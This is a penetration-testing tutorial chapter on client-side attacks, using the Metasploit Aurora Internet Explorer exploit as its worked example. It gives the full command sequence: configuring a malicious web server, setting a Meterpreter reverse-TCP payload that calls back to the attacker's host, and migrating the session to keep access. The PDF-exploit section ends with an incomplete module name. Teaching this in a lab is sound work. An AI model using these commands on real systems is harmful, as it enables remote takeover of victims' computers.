### Client-Side Exploitation

Client-side attacks rely on the successful download and execution of an exploit in a vulnerable application. In this chapter, we will explore techniques to entice users into opening malicious files. We will start by examining some common client-side exploits, with a focus on web browsers, which are often the primary target for such attacks.

#### Browser Exploitation

Web browsers are designed to render web pages, but they can be compromised if they process malicious code. By sending malformed input to a browser, attackers can potentially hijack its execution and run arbitrary code. This is similar to how server software can be exploited, but the delivery method differs. Major browsers, including Internet Explorer, Firefox, and even Mobile Safari, have all been subject to security vulnerabilities.

##### iPhone Jailbreaking via Browser Exploitation

Browser exploitation has played a significant role in jailbreaking iPhones. While iOS includes a security feature called mandatory code signing, which requires all executed code to be approved by Apple, Mobile Safari is exempted because it must be able to run unsigned code to render web pages. This makes it a potential entry point for attackers. For example, in iOS 4, a vulnerability in the font rendering of PDF documents in Mobile Safari allowed jailbreakers to gain control of the device by tricking users into opening a malicious link.

##### The Aurora Exploit

The Aurora exploit, used in 2010 against major companies like Google, Adobe, and Yahoo!, targeted a zero-day vulnerability in Internet Explorer. Even fully updated versions of Internet Explorer were vulnerable if users opened a malicious web page. Microsoft has since released patches, but many users fail to update their browsers, leaving them exposed.

We will use Metasploit to demonstrate how to exploit a vulnerable browser using the Aurora exploit module, `exploit/windows/browser/ms10_002_aurora`.

**Note:** Client-side Metasploit modules function similarly to server-side modules, but with different options. Instead of sending exploits to a remote host, we set up a server and wait for a browser to access our page.

```bash
msf > use exploit/windows/browser/ms10_002_aurora
msf exploit(ms10_002_aurora) > show options
```

**Module Options:**

- **SRVHOST**: The local host to listen on (default: 0.0.0.0).
- **SRVPORT**: The local port to listen on (default: 8080).
- **SSL**: Negotiate SSL for incoming connections (default: false).
- **SSLCert**: Path to a custom SSL certificate.
- **SSLVersion**: Specify the version of SSL to use (accepted: SSL2, SSL3, TLS1).
- **URIPATH**: The URI to use for this exploit (default: random).

**Exploit Target:**

- **Automatic**: Automatically selects the target.

**Example Configuration:**

```bash
msf exploit(ms10_002_aurora) > set SRVHOST 192.168.20.9
msf exploit(ms10_002_aurora) > set SRVPORT 80
msf exploit(ms10_002_aurora) > set URIPATH aurora
msf exploit(ms10_002_aurora) > set payload windows/meterpreter/reverse_tcp
msf exploit(ms10_002_aurora) > set LHOST 192.168.20.9
msf exploit(ms10_002_aurora) > exploit
```

**Output:**

- A web server is started on the specified SRVPORT and URIPATH.
- A handler is set up for the selected payload.

**Exploiting the Vulnerability:**

To exploit the vulnerability, the target must browse to the malicious site. If successful, a Meterpreter session will be established. However, the Aurora exploit is not always reliable, and the browser may crash. If this happens, try accessing the exploit page again.

**Session Management:**

If the browser crashes, the Meterpreter session will also terminate. To maintain persistence, we can use the `migrate` script to move the session to a more stable process.

**Running Scripts in a Meterpreter Session:**

Meterpreter scripts can automate tasks within a session. For example, the `migrate` script allows us to move the session to a different process.

**Example:**

```bash
meterpreter > run migrate
OPTIONS:
-f: Launch a process and migrate into the new process.
-h: Help menu.
-k: Kill original process.
-n: Migrate into the first process with this executable name (e.g., explorer.exe).
-p: PID to migrate to.
```

**Advanced Parameters:**

Metasploit modules also support advanced parameters, such as `AutoRunScript`, which can automatically run a script when a session is created.

**Example:**

```bash
msf exploit(ms10_002_aurora) > set AutoRunScript migrate -f
msf exploit(ms10_002_aurora) > exploit
```

This configuration will automatically migrate the session to a new process, ensuring it remains active even if the browser crashes.

### PDF Exploits

Portable Document Format (PDF) software, such as Adobe Reader, can also be exploited. If a user opens a malicious PDF in a vulnerable viewer, the program can be compromised. Adobe Reader, like web browsers, has a history of security vulnerabilities, and many systems remain unpatched.

#### Exploiting a PDF Vulnerability

Our Windows XP target has an outdated version of Adobe Reader 8.1.2, which is vulnerable to CVE-2008-2992, a stack-based buffer overflow. The corresponding Metasploit module is `exploit/windows/fileformat/`.

By understanding and exploiting these vulnerabilities, attackers can gain command execution on a target system. Regular updates and patch management are crucial to mitigate such risks.